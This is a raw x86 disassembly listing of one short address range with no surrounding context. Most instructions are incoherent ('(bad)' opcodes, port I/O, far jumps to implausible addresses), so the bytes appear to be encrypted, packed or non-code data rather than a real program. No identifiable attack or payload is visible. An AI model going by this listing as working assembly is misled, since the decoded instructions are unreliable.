  40c978:	xor    edx,DWORD PTR [edi-0x50eba758]
  40c97e:	std    
  40c97f:	pop    ebx
  40c980:	das    
  40c981:	addr16 cs xchg edx,eax
  40c984:	jp     0x40c9e0
  40c986:	outs   dx,BYTE PTR ds:[esi]
  40c987:	pop    ds
  40c988:	and    eax,0x2d24adaa
  40c98d:	sub    BYTE PTR [ecx-0x187c8558],0xa5
  40c994:	push   ecx
  40c995:	rol    BYTE PTR [esi-0x50],1
  40c998:	xor    eax,0xaaac506e
  40c99d:	dec    ebp
  40c99e:	out    dx,eax
  40c99f:	push   ecx
  40c9a0:	fidiv  DWORD PTR [ebp+0x54fe9b7e]
  40c9a6:	into   
  40c9a7:	pop    ebp
  40c9a8:	mov    ebp,0x189f7557
  40c9ad:	repnz test al,0xf3
  40c9b0:	sub    eax,0x737c793b
  40c9b5:	std    
  40c9b6:	inc    ebp
  40c9b7:	das    
  40c9b8:	sahf   
  40c9b9:	inc    esp
  40c9ba:	dec    edi
  40c9bb:	or     eax,0x1672e2a
  40c9c0:	xor    al,0xcb
  40c9c2:	or     al,0xac
  40c9c4:	pop    ds
  40c9c5:	in     al,0x2b
  40c9c7:	div    DWORD PTR [ecx-0x25daf481]
  40c9cd:	fild   DWORD PTR [esi]
  40c9cf:	jge    0x40ca3d
  40c9d1:	sti    
  40c9d2:	(bad)  
  40c9d3:	loop   0x40c991
  40c9d5:	mov    esi,0xf87b0e55
  40c9da:	(bad)  
  40c9db:	mov    ah,0xa1
  40c9dd:	in     al,dx
  40c9de:	and    al,BYTE PTR [esi+ebp*4]
  40c9e1:	sub    BYTE PTR [ecx],bh
  40c9e3:	retf   
  40c9e4:	test   eax,0xa372d0e9
  40c9e9:	retf   
  40c9ea:	(bad)  
  40c9eb:	aaa    
  40c9ec:	cwde   
  40c9ed:	sub    edx,DWORD PTR [ecx]
  40c9ef:	jge    0x40c9bf
  40c9f1:	es and al,0xb4
  40c9f4:	pop    esp
  40c9f5:	stc    
  40c9f6:	imul   edx,edi,0xffffffe1
  40c9f9:	push   esi
  40c9fa:	jno    0x40c9ba
  40c9fc:	rcr    BYTE PTR [eax+0x15445e1d],cl
  40ca02:	mov    bl,0xff
  40ca04:	cmp    cl,BYTE PTR [edx+0x4f]
  40ca07:	add    al,0x7
  40ca09:	jl     0x40c9e7
  40ca0b:	push   cs
  40ca0c:	shl    DWORD PTR [edi-0x4f77fe0a],1
  40ca12:	repz inc edi
  40ca14:	push   ebp
  40ca15:	mov    WORD PTR ds:0x95f5a03b,es
  40ca1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca1c:	int3   
  40ca1d:	push   ds
  40ca1e:	push   esp
  40ca1f:	push   edi
  40ca20:	and    ch,bh
  40ca22:	stos   BYTE PTR es:[edi],al
  40ca23:	ds add al,0xa0
  40ca26:	mov    al,0xb0
  40ca28:	adc    DWORD PTR [ebx*2-0x1412144d],ebx
  40ca2f:	pop    esi
  40ca30:	and    DWORD PTR [ebp-0x40],0xffffffc6
  40ca34:	ficomp WORD PTR [eax+ebx*8+0x1b51b238]
  40ca3b:	fst    DWORD PTR ds:0x80c6735
  40ca41:	pushf  
  40ca42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca43:	fld1   
  40ca45:	ins    DWORD PTR es:[edi],dx
  40ca46:	loope  0x40ca76
  40ca48:	pop    esi
  40ca49:	xchg   BYTE PTR [ecx],dl
  40ca4b:	sub    DWORD PTR [esi],0x17611a92
  40ca51:	popf   
  40ca52:	out    dx,al
  40ca53:	xchg   esp,eax
  40ca54:	in     eax,dx
  40ca55:	aas    
  40ca56:	and    eax,0x6c6852d6
  40ca5b:	inc    eax
  40ca5c:	mov    edx,0x37b21bec
  40ca61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca62:	retf   
  40ca63:	in     eax,dx
  40ca64:	stos   DWORD PTR es:[edi],eax
  40ca65:	jae    0x40ca88
  40ca67:	mov    cl,0xc
  40ca69:	addr16 xchg edi,eax
  40ca6b:	mov    dh,0x38
  40ca6d:	pushf  
  40ca6e:	(bad)  
  40ca70:	xor    al,0x49
  40ca72:	pop    esp
  40ca73:	(bad)  
  40ca74:	arpl   WORD PTR [edi-0x5],sp
  40ca77:	adc    BYTE PTR [edi],al
  40ca79:	mov    al,0xbb
  40ca7b:	stc    
  40ca7c:	add    BYTE PTR [ebx-0x1974bb61],bl
  40ca82:	dec    ecx
  40ca83:	fcomp  st(1)
  40ca85:	ins    DWORD PTR es:[edi],dx
  40ca86:	out    0x6b,al
  40ca88:	cld    
  40ca89:	iret   
  40ca8a:	mov    esi,DWORD PTR fs:[edi]
  40ca8d:	adc    ebp,DWORD PTR [ebp+0x3]
  40ca90:	je     0x40ca45
  40ca92:	sbb    al,0x34
  40ca94:	into   
  40ca95:	stc    
  40ca96:	lds    edx,FWORD PTR [esi-0x26f93a86]
  40ca9c:	mov    esi,0xcb8ce138
  40caa1:	or     DWORD PTR [ebx-0x9],ebx
  40caa4:	jbe    0x40cb04
  40caa6:	repz daa 
  40caa8:	and    DWORD PTR [ebx+eax*2],esi
  40caab:	lods   eax,DWORD PTR es:[esi]
  40caad:	sub    eax,0xf833a498
  40cab2:	xchg   ebx,eax
  40cab3:	hlt    
  40cab4:	or     al,0xa2
  40cab6:	call   0x23aae0be
  40cabb:	out    0x36,al
  40cabd:	lds    ebp,FWORD PTR [ecx-0x62]
  40cac0:	xchg   ebx,eax
  40cac1:	xor    al,0xb8
  40cac3:	sbb    bl,ch
  40cac5:	xchg   edi,eax
  40cac6:	lods   al,BYTE PTR ds:[esi]
  40cac7:	int    0x1f
  40cac9:	sbb    esi,eax
  40cacb:	mov    BYTE PTR [edx-0x8],0x9a
  40cacf:	pop    esp
  40cad0:	leave  
  40cad1:	retf   
  40cad2:	pusha  
  40cad3:	sbb    al,BYTE PTR [edx]
  40cad5:	xchg   esp,eax
  40cad6:	xchg   edi,eax
  40cad7:	bound  esi,QWORD PTR [ebx+ebx*4-0x499c5a5]
  40cade:	mov    dh,0x40
  40cae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae1:	retf   0x5095
  40cae4:	jmp    DWORD PTR [ebx-0x4f8e8807]
  40caeb:	test   BYTE PTR [edi-0x3502fe4e],cl
  40caf1:	fdivp  st(6),st
  40caf3:	fsub   QWORD PTR [ebx-0x6f]
  40caf6:	sub    BYTE PTR [edx+esi*1-0x7c],dh
  40cafa:	dec    ecx
  40cafb:	outs   dx,DWORD PTR ds:[esi]
  40cafd:	jle    0x40ca86
  40caff:	lds    esi,FWORD PTR ds:0x6abe37e5
  40cb05:	pop    ss
  40cb06:	jnp    0x40caa5
  40cb08:	mov    ds:0x3f2954b7,al
  40cb0d:	lea    eax,[ebp-0x2]
  40cb10:	les    esp,FWORD PTR [ecx-0x74]
  40cb13:	not    BYTE PTR [edi+0x40]
  40cb16:	stos   DWORD PTR es:[edi],eax
  40cb17:	jle    0x40cb6c
  40cb19:	push   ds
  40cb1a:	(bad)  
  40cb1b:	pop    ds
  40cb1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb1d:	inc    BYTE PTR [ebx-0x59b2ca4e]
  40cb23:	(bad)  
  40cb24:	jnp    0x40cb14
  40cb26:	in     al,dx
  40cb27:	sbb    eax,esi
  40cb29:	nop
  40cb2a:	ror    ah,0xe5
  40cb2d:	mov    esp,0xbf24a4c0
  40cb32:	dec    eax
  40cb33:	arpl   WORD PTR [ecx+0x1c4a2638],dx
  40cb39:	stos   BYTE PTR es:[edi],al
  40cb3a:	outs   dx,DWORD PTR ds:[esi]
  40cb3b:	cdq    
  40cb3c:	push   esi
  40cb3d:	add    esi,DWORD PTR [esi+ebp*1+0x4d47a5d1]
  40cb44:	enter  0x429a,0x83
  40cb48:	int    0x82
  40cb4a:	push   ebp
  40cb4b:	jne    0x40cad4
  40cb4d:	arpl   WORD PTR [ecx-0x3531c614],sp
  40cb53:	mov    esp,DWORD PTR ds:0x9c38da04
  40cb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb5a:	neg    esi
  40cb5c:	gs jbe 0x40cbb2
  40cb5f:	mov    dl,0x5e
  40cb61:	xor    dl,al
  40cb63:	cmovg  ecx,DWORD PTR [eax-0x55]
  40cb67:	xchg   ebx,eax
  40cb68:	nop
  40cb69:	jbe    0x40caf0
  40cb6b:	pop    edx
  40cb6c:	addr16 inc esi
  40cb6e:	repnz sbb BYTE PTR ds:0x59d3aec6,al
  40cb75:	xor    ebx,ebx
  40cb77:	sbb    eax,0xd48e7d60
  40cb7c:	rol    BYTE PTR [edi],0x30
  40cb7f:	sbb    al,0x3a
  40cb81:	sti    
  40cb82:	pop    es
  40cb83:	jmp    0xc1b3cf43
  40cb88:	push   ds
  40cb89:	in     eax,dx
  40cb8a:	imul   DWORD PTR [edx+eiz*8+0x6]
  40cb8e:	and    bh,al
  40cb90:	das    
  40cb91:	or     ch,bh
  40cb93:	and    bh,BYTE PTR [eax]
  40cb95:	loopne 0x40cb86
  40cb97:	and    ebx,ecx
  40cb99:	shl    BYTE PTR [edi-0x7c],1
  40cb9c:	add    ebx,DWORD PTR [edx]
  40cb9e:	fst    QWORD PTR [ecx-0x181ab6e5]
  40cba4:	in     al,dx
  40cba5:	ins    DWORD PTR es:[edi],dx
  40cba6:	jmp    0x469b:0x4f9117ce
  40cbad:	das    
  40cbae:	mov    edx,0x6aa1ece0
  40cbb3:	gs push ebx
  40cbb5:	leave  
  40cbb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb7:	outs   dx,BYTE PTR ds:[esi]
  40cbb8:	iret   
  40cbb9:	xchg   ecx,eax
  40cbba:	imul   ecx,DWORD PTR [ecx-0x71d5280f],0xffffffe3
  40cbc1:	test   eax,0xb736f81c
  40cbc6:	test   al,0x40
  40cbc8:	cmp    ah,dh
  40cbca:	pop    edx
  40cbcb:	imul   ebx,DWORD PTR [edx],0x57
  40cbce:	ucomiss xmm2,DWORD PTR [ebp+esi*4+0x5b]
  40cbd3:	lea    esi,[edx-0xe]
  40cbd6:	lods   al,BYTE PTR ds:[esi]
  40cbd7:	fmul   DWORD PTR [eax]
  40cbd9:	mov    DWORD PTR [eax+ebp*2+0x320bb32b],ebp
  40cbe0:	sub    BYTE PTR [esi+ebp*8+0xf4944f3],0xe2
  40cbe8:	push   ss
  40cbe9:	js     0x40cbce
  40cbeb:	add    edx,ebp
  40cbed:	xor    BYTE PTR [ebp+0x3],dh
  40cbf0:	pop    edi
  40cbf1:	iret   
  40cbf2:	leave  
  40cbf3:	jg     0x40cc06
  40cbf5:	lds    ebx,FWORD PTR [esi+eiz*8]
  40cbf8:	jno    0x40cc5b
  40cbfa:	or     eax,0xb1908731
  40cbff:	loope  0x40cba7
  40cc01:	mov    ds:0x36d5c67f,al
  40cc06:	(bad)  
  40cc07:	sahf   
  40cc08:	push   ecx
  40cc09:	jbe    0x40cc5e
  40cc0b:	adc    ecx,esp
  40cc0d:	pop    eax
  40cc0e:	push   ecx
  40cc0f:	xchg   ebp,eax
  40cc10:	push   esp
  40cc11:	stos   BYTE PTR es:[edi],al
  40cc12:	rcr    BYTE PTR [esi+esi*2-0xdb46834],1
  40cc19:	fcom   QWORD PTR [di+0x12]
  40cc1d:	pop    ebp
  40cc1e:	hlt    
  40cc1f:	aaa    
  40cc20:	cld    
  40cc21:	pop    ebp
  40cc22:	out    dx,al
  40cc23:	jg     0x40cc25
  40cc25:	xchg   esp,eax
  40cc26:	sbb    eax,eax
  40cc28:	mov    ebp,0x23aa54e2
  40cc2d:	xchg   ebx,eax
  40cc2e:	xchg   esp,eax
  40cc2f:	fidiv  WORD PTR [ebx+0x71]
  40cc32:	cmp    DWORD PTR [ebp+0x40],ebx
  40cc35:	ja     0x40cc77
  40cc37:	(bad)  [esi-0x80]
  40cc3a:	or     BYTE PTR [edx+esi*4],0xb4
  40cc3e:	mov    esi,0xad9c7e4c
  40cc43:	add    al,0x1c
  40cc45:	mov    cl,0xd6
  40cc47:	sub    ch,BYTE PTR [ebp-0x19ff1cd6]
  40cc4d:	int3   
  40cc4e:	scas   eax,DWORD PTR es:[edi]
  40cc4f:	rcl    bh,0x3a
  40cc52:	mov    dl,bl
  40cc54:	(bad)  
  40cc55:	aaa    
  40cc56:	(bad)  
  40cc57:	stc    
  40cc58:	push   ds
  40cc59:	and    al,0x9f
  40cc5b:	repz jb 0x40ccae
  40cc5e:	add    dh,ch
  40cc60:	je     0x40cbe3
  40cc62:	outs   dx,DWORD PTR ds:[esi]
  40cc63:	mov    bl,BYTE PTR [esi+0x2c]
  40cc66:	stos   DWORD PTR es:[edi],eax
  40cc67:	ins    DWORD PTR es:[edi],dx
  40cc68:	mov    cl,BYTE PTR [edx-0x4e]
  40cc6b:	loopne 0x40cc1b
  40cc6d:	add    edi,ecx
  40cc6f:	clc    
  40cc70:	inc    ecx
  40cc71:	inc    eax
  40cc72:	xchg   DWORD PTR [ebp-0x26],eax
  40cc75:	dec    ebx
  40cc76:	or     esp,esp
  40cc78:	leave  
  40cc79:	mov    eax,cs:0xcd0448c3
  40cc7f:	(bad)  
  40cc80:	stc    
  40cc81:	scas   al,BYTE PTR es:[edi]
  40cc82:	(bad)  
  40cc83:	mov    edx,0x3d103c8
  40cc88:	stc    
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	loope  0x40cd06
  40cca8:	je     0x40cc75
  40ccaa:	cmp    edx,DWORD PTR [edx+0x79ca7c7c]
  40ccb0:	jl     0x40cd2e
  40ccb2:	cld    
  40ccb3:	xchg   esi,eax
  40ccb4:	add    bh,ah
  40ccb6:	repnz xor eax,0x7bf9620e
  40ccbc:	fcmovu st,st(0)
  40ccbe:	loopne 0x40ccfd
  40ccc0:	inc    esi
  40ccc1:	push   edx
  40ccc2:	and    DWORD PTR [edx+0x9d796d7],ebx
  40ccc8:	js     0x40cd35
  40ccca:	adc    ch,dl
  40cccc:	pop    ss
  40cccd:	cmp    BYTE PTR [ebx-0x5548b750],dl
  40ccd3:	fsub   QWORD PTR [ebp-0x5d]
  40ccd6:	test   BYTE PTR [edi+0x153b5878],bl
  40ccdc:	add    BYTE PTR [ecx-0x22],bh
  40ccdf:	mov    esi,0x1e472222
  40cce4:	icebp  
  40cce5:	cmp    BYTE PTR [eax],dl
  40cce7:	mov    BYTE PTR [edx-0x6d17b43f],bh
  40cced:	sub    BYTE PTR [edi+ecx*2+0x66ba1961],cl
  40ccf4:	mov    bh,0x75
  40ccf6:	cmp    DWORD PTR gs:[esi+esi*2+0x4c329da1],0xffffffce
  40ccff:	inc    ebp
  40cd00:	lods   eax,DWORD PTR ds:[esi]
  40cd01:	outs   dx,DWORD PTR ds:[esi]
  40cd02:	shl    DWORD PTR [esi],0xeb
  40cd05:	xchg   ecx,eax
  40cd06:	inc    edi
  40cd07:	outs   dx,DWORD PTR ds:[esi]
  40cd08:	cmp    esi,eax
  40cd0a:	inc    esp
  40cd0b:	fild   WORD PTR [ebx-0x7]
  40cd0e:	popa   
  40cd0f:	(bad)  
  40cd10:	or     al,0x57
  40cd12:	out    dx,al
  40cd13:	add    DWORD PTR [eax+eiz*2+0x511a7957],ebp
  40cd1a:	shl    BYTE PTR [edi-0x5dfc0ce4],0xa9
  40cd21:	mov    bl,0xfc
  40cd23:	xor    esp,DWORD PTR [edi+0x3582e4e5]
  40cd29:	ror    bh,cl
  40cd2b:	jbe    0x40ccbf
  40cd2d:	or     al,0x63
  40cd2f:	std    
  40cd30:	(bad)  
  40cd31:	iret   
  40cd32:	pop    esi
  40cd33:	ja     0x40cd9a
  40cd35:	add    ecx,DWORD PTR [esi-0x31]
  40cd38:	cld    
  40cd39:	ret    
  40cd3a:	lods   al,BYTE PTR ds:[esi]
  40cd3b:	add    ch,dh
  40cd3d:	xchg   BYTE PTR [ebp+ebx*4+0x524d0b39],dl
  40cd44:	mov    dl,0xf4
  40cd46:	shl    BYTE PTR [esi-0x63c29999],cl
  40cd4c:	es fwait
  40cd4e:	pop    edx
  40cd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd50:	inc    ebx
  40cd51:	inc    ecx
  40cd52:	ffree  st(3)
  40cd54:	pop    esp
  40cd55:	loop   0x40cd1a
  40cd57:	call   0x8694:0x8896129c
  40cd5e:	fs pushf 
  40cd60:	xchg   DWORD PTR [ebp+0x15],ecx
  40cd63:	cli    
  40cd64:	jae    0x40cd82
  40cd66:	mov    eax,ds:0x368bdf09
  40cd6b:	cmp    al,0x2e
  40cd6d:	xor    al,0x1
  40cd6f:	push   eax
  40cd70:	dec    ebp
  40cd71:	sub    eax,0x4fbb5ee1
  40cd76:	mov    bl,0x9c
  40cd78:	adc    eax,0xcbe1f9c
  40cd7d:	out    dx,eax
  40cd7e:	js     0x40cd4c
  40cd80:	jle    0x40cdd7
  40cd82:	stc    
  40cd83:	xor    esi,DWORD PTR [eax+0x6a552289]
  40cd89:	and    ecx,DWORD PTR [eax+0x3f]
  40cd8c:	sub    esi,DWORD PTR [esi+0x79d9d5d1]
  40cd92:	xor    eax,0x381620a8
  40cd97:	jne    0x40cde7
  40cd99:	mov    cl,0xef
  40cd9b:	popf   
  40cd9c:	outs   dx,DWORD PTR ds:[esi]
  40cd9d:	lods   al,BYTE PTR ds:[esi]
  40cd9e:	fwait
  40cd9f:	enter  0xdf10,0x2f
  40cda3:	hlt    
  40cda4:	xor    ebp,DWORD PTR [ecx]
  40cda6:	mov    dh,0x49
  40cda8:	dec    edi
  40cda9:	mov    ds:0x505b38dc,eax
  40cdae:	lahf   
  40cdaf:	jnp    0x40ce29
  40cdb1:	leave  
  40cdb2:	sti    
  40cdb3:	add    ecx,DWORD PTR [ebx+eiz*8]
  40cdb6:	scas   al,BYTE PTR es:[edi]
  40cdb7:	mov    ds:0x4d862d4a,al
  40cdbc:	fs mov ebx,0xfe0bffae
  40cdc2:	push   ds
  40cdc3:	push   0x9248820c
  40cdc8:	imul   esi,DWORD PTR [ecx+edx*2-0x278813d4],0xae44e89e
  40cdd3:	add    DWORD PTR [edi],ebp
  40cdd5:	push   edx
  40cdd6:	xchg   ebp,eax
  40cdd7:	dec    ebx
  40cdd8:	xchg   ecx,eax
  40cdd9:	jecxz  0x40ce31
  40cddb:	ja     0x40cd7f
  40cddd:	mov    ebp,0x30a01db9
  40cde2:	mov    DWORD PTR [edx+0x79d1c0e2],esp
  40cde8:	je     0x40ce65
  40cdea:	dec    esp
  40cdeb:	daa    
  40cdec:	cmp    dl,BYTE PTR [edi+0x58]
  40cdef:	loope  0x40ce53
  40cdf1:	ror    BYTE PTR [edi-0x2f1da679],cl
  40cdf7:	pushf  
  40cdf8:	cwde   
  40cdf9:	jge    0x40cda2
  40cdfb:	mov    ds:0x130424c,al
  40ce00:	xlat   BYTE PTR ds:[ebx]
  40ce01:	or     eax,0xf49cc269
  40ce06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce07:	mov    WORD PTR [eax-0x3d903410],?
  40ce0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce0e:	jns    0x40cdad
  40ce10:	dec    ecx
  40ce11:	outs   dx,BYTE PTR ds:[esi]
  40ce12:	sub    ebx,ebp
  40ce14:	cmp    DWORD PTR [edi-0xa],edx
  40ce17:	xor    bh,BYTE PTR [ebx+0x5198d1f8]
  40ce1d:	adc    eax,0x9ac14c96
  40ce22:	mov    ah,0xc8
  40ce24:	ror    eax,1
  40ce26:	out    dx,eax
  40ce27:	dec    edx
  40ce28:	jnp    0x40ce01
  40ce2a:	push   ecx
  40ce2b:	or     BYTE PTR [ecx+ebx*4],bh
  40ce2e:	in     eax,0xe9
  40ce30:	retf   
  40ce31:	test   eax,0x93d5c18a
  40ce36:	test   al,0xc
  40ce38:	mov    ebp,0xe11a3ad
  40ce3d:	mov    ?,esp
  40ce3f:	mov    BYTE PTR [esi],al
  40ce41:	out    dx,al
  40ce42:	dec    esi
  40ce43:	sub    ch,BYTE PTR [ebx-0x5f9b4a93]
  40ce49:	test   edi,edi
  40ce4b:	les    esp,FWORD PTR [edi-0x3b]
  40ce4e:	inc    ebp
  40ce4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce50:	xor    al,0xaf
  40ce52:	sub    BYTE PTR [ebp+0x332d50be],bh
  40ce58:	xchg   DWORD PTR [esi+0x52],eax
  40ce5b:	stos   BYTE PTR es:[edi],al
  40ce5c:	lds    edx,FWORD PTR [edx+0x7e139e7]
  40ce62:	rcr    BYTE PTR [ecx+0x1e],1
  40ce65:	mov    dl,0xfc
  40ce67:	daa    
  40ce68:	push   ds
  40ce69:	ret    0x7855
  40ce6c:	mov    ds:0x1ab5fc8c,eax
  40ce71:	fstp   DWORD PTR [edi-0x167a5fc9]
  40ce77:	pop    es
  40ce78:	mov    BYTE PTR [eax+0x426de28a],ch
  40ce7e:	push   cs
  40ce7f:	xor    dl,dl
  40ce81:	cmc    
  40ce82:	cmc    
  40ce83:	aas    
  40ce84:	dec    esi
  40ce85:	cmc    
  40ce86:	jecxz  0x40ce4f
  40ce88:	out    dx,al
  40ce89:	and    eax,0x62254564
  40ce8e:	cmp    bh,BYTE PTR [eax+0x9]
  40ce91:	in     eax,dx
  40ce92:	xchg   edx,eax
  40ce93:	jbe    0x40ce47
  40ce95:	xor    esp,DWORD PTR [esi+0xdbefbfe]
  40ce9b:	inc    ecx
  40ce9c:	ins    BYTE PTR es:[edi],dx
  40ce9d:	sbb    DWORD PTR [esi],esp
  40ce9f:	push   edx
  40cea0:	call   0x5cbc:0x447bc2c2
  40cea7:	cmp    ah,BYTE PTR [esi+0xa1d8e73]
  40cead:	jmp    0xc24ad2a2
  40ceb2:	xor    al,ah
  40ceb4:	scas   al,BYTE PTR es:[edi]
  40ceb5:	mov    bh,BYTE PTR [edi-0x641a9635]
  40cebb:	bound  eax,QWORD PTR ds:0x57a5091
  40cec1:	lods   eax,DWORD PTR ds:[esi]
  40cec2:	and    DWORD PTR [esi],edi
  40cec4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cec6:	xor    eax,DWORD PTR [ecx-0x7f]
  40cec9:	cli    
  40ceca:	sbb    eax,0x405e045d
  40cecf:	mov    WORD PTR ds:[ebx-0x3f506bfc],es
  40ced6:	mov    WORD PTR [esi+0x4df48e1e],?
  40cedc:	xor    esp,eax
  40cede:	push   es
  40cedf:	jo     0x40cecd
  40cee1:	mov    esi,0x5428b7d7
  40cee6:	gs aas 
  40cee8:	mov    BYTE PTR [edx+0x6cf5a07f],cl
  40ceee:	mov    ds:0xd4807904,eax
  40cef3:	sub    BYTE PTR [eax-0x72],ah
  40cef6:	rcl    BYTE PTR [ecx],1
  40cef8:	sar    ebp,0x98
  40cefb:	out    dx,al
  40cefc:	add    ah,BYTE PTR [edi-0x3a65d252]
  40cf02:	sbb    bh,BYTE PTR [eax-0x1976dd20]
  40cf08:	cmp    bl,BYTE PTR [ebp-0x3d]
  40cf0b:	repz repnz rcl BYTE PTR [ebp-0x58],1
  40cf10:	mov    edi,0xbabc60f2
  40cf15:	push   0xe51a3dc2
  40cf1a:	xchg   esp,eax
  40cf1b:	dec    ebx
  40cf1c:	jb     0x40cf20
  40cf1e:	push   ds
  40cf1f:	cdq    
  40cf20:	dec    eax
  40cf21:	sbb    DWORD PTR [edi+eax*2+0x29],esi
  40cf25:	inc    ebp
  40cf26:	dec    esp
  40cf27:	pop    ecx
  40cf28:	jbe    0x40cf9f
  40cf2a:	jno    0x40ceef
  40cf2c:	pop    ds
  40cf2d:	push   ebx
  40cf2e:	imul   esp,DWORD PTR [esi+0x16],0x6d
  40cf32:	ins    BYTE PTR es:[edi],dx
  40cf33:	push   eax
  40cf34:	test   DWORD PTR [ebx+0x76],ebx
  40cf37:	xor    DWORD PTR [ebp+0x73],0x50
  40cf3b:	mov    ah,0xa3
  40cf3d:	pop    ebx
  40cf3e:	mov    al,0xc3
  40cf40:	aas    
  40cf41:	inc    ebx
  40cf42:	imul   edx,DWORD PTR [esi-0x1c432eac],0xe0c754ad
  40cf4c:	sti    
  40cf4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf4e:	sub    dl,BYTE PTR [esi+0x34285695]
  40cf54:	imul   ebx,DWORD PTR [edx],0xffffff8b
  40cf57:	movaps xmm7,xmm6
  40cf5a:	and    bl,ah
  40cf5c:	cld    
  40cf5d:	imul   edi,DWORD PTR [edi+0x58],0xfffffffd
  40cf61:	xchg   edi,eax
  40cf62:	shl    BYTE PTR [ecx],0x49
  40cf65:	or     eax,0xe9a4277c
  40cf6a:	pop    edi
  40cf6b:	xor    BYTE PTR [edx+0x21876c80],cl
  40cf71:	mov    edx,0x78ba12a4
  40cf76:	cmc    
  40cf77:	jg     0x40cf7e
  40cf79:	and    al,dh
  40cf7b:	popa   
  40cf7c:	lds    esi,FWORD PTR [edx+0x3b3deeaf]
  40cf82:	inc    edx
  40cf83:	cli    
  40cf84:	push   ebp
  40cf85:	stos   DWORD PTR es:[edi],eax
  40cf86:	inc    edi
  40cf87:	xor    esp,DWORD PTR [esi+0x5c471f73]
  40cf8d:	mov    ds:0x861c5bca,al
  40cf92:	ja     0x40cffc
  40cf94:	ss stc 
  40cf96:	mov    al,ds:0x9977ccd3
  40cf9b:	dec    esp
  40cf9c:	push   ss
  40cf9d:	mov    ebp,0x8868608d
  40cfa2:	ds iret 
  40cfa4:	aam    0xeb
  40cfa6:	dec    eax
  40cfa8:	and    al,ch
  40cfaa:	in     al,dx
  40cfab:	sbb    ebx,DWORD PTR [eax-0x51]
  40cfae:	cmc    
  40cfaf:	pop    eax
  40cfb0:	or     al,0x13
  40cfb2:	icebp  
  40cfb3:	pop    ss
  40cfb4:	call   0x8c20:0x8e2da48d
  40cfbb:	es adc al,bh
  40cfbe:	add    al,0xce
  40cfc0:	mov    esp,0x28751feb
  40cfc5:	ss or  eax,0x7c626334
  40cfcb:	lahf   
  40cfcc:	into   
  40cfcd:	int3   
  40cfce:	xor    al,0x3b
  40cfd0:	xchg   esp,eax
  40cfd1:	sub    DWORD PTR [edx+0x4e22b750],0x29533cea
  40cfdb:	push   ss
  40cfdc:	or     esp,edi
  40cfde:	xor    BYTE PTR [eax+0x7e],ah
  40cfe1:	rcl    BYTE PTR [ebx],cl
  40cfe3:	(bad)  
  40cfe4:	sbb    bl,bl
  40cfe6:	push   esp
  40cfe7:	add    BYTE PTR [esi+0x7f1dc89f],dl
  40cfed:	mov    al,ds:0xc0669cd9
  40cff2:	sbb    al,BYTE PTR [eiz*2+0x7c144e2a]
  40cff9:	mov    esi,0x6fe800f2
  40cffe:	loop   0x40d015
  40d000:	jg     0x40cf82
  40d002:	mov    eax,0x9ffc9dee
  40d007:	lea    ecx,[ebx-0x2fcc2383]
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	xor    eax,edi
  40d025:	inc    ebp
  40d026:	sbb    BYTE PTR [ecx-0x35838361],dl
  40d02c:	jns    0x40d0aa
  40d02e:	jl     0x40d092
  40d030:	ret    
  40d031:	adc    bl,BYTE PTR [ecx]
  40d033:	pop    esi
  40d034:	test   DWORD PTR [ecx+0x5c56362],esp
  40d03a:	retf   0x356c
  40d03d:	or     DWORD PTR [ebx-0x6bfaa097],0x55
  40d044:	xchg   esi,eax
  40d045:	push   ss
  40d046:	dec    edx
  40d047:	sbb    al,0x2e
  40d049:	lods   al,BYTE PTR ds:[esi]
  40d04a:	jbe    0x40d079
  40d04c:	and    eax,0xa02e39d8
  40d051:	int    0x94
  40d053:	test   al,0x96
  40d055:	inc    ebp
  40d056:	into   
  40d057:	mov    dh,0x63
  40d059:	mov    bh,BYTE PTR [edx+0xdf3be9]
  40d05f:	push   edi
  40d060:	push   ecx
  40d061:	cmp    al,0x79
  40d063:	fwait
  40d064:	sbb    BYTE PTR [edi],ch
  40d066:	call   0xe5ca903f
  40d06b:	add    edi,eax
  40d06d:	loop   0x40d028
  40d06f:	imul   ebx,eax,0x6e
  40d072:	lods   eax,DWORD PTR ds:[esi]
  40d073:	imul   ebp,DWORD PTR [ebp-0x3e],0x7c909e41
  40d07a:	xchg   BYTE PTR [edi-0x1a],cl
  40d07d:	pop    ds
  40d07e:	jecxz  0x40d02a
  40d080:	and    BYTE PTR [eax-0x61],bl
  40d083:	dec    edx
  40d084:	pop    edi
  40d085:	cmp    BYTE PTR [esi],al
  40d087:	lock in al,0x39
  40d08a:	push   ecx
  40d08b:	sub    eax,ecx
  40d08d:	push   edx
  40d08e:	rcr    ebx,0x96
  40d091:	popf   
  40d092:	sti    
  40d093:	and    BYTE PTR [ebx+0x3b],bl
  40d096:	add    eax,0xfde486da
  40d09b:	es lahf 
  40d09d:	pop    ds
  40d09e:	push   ds
  40d09f:	mov    dh,0x41
  40d0a1:	mov    al,ds:0xe5c445c9
  40d0a6:	push   es
  40d0a7:	ror    DWORD PTR [ebp-0x4adc3362],cl
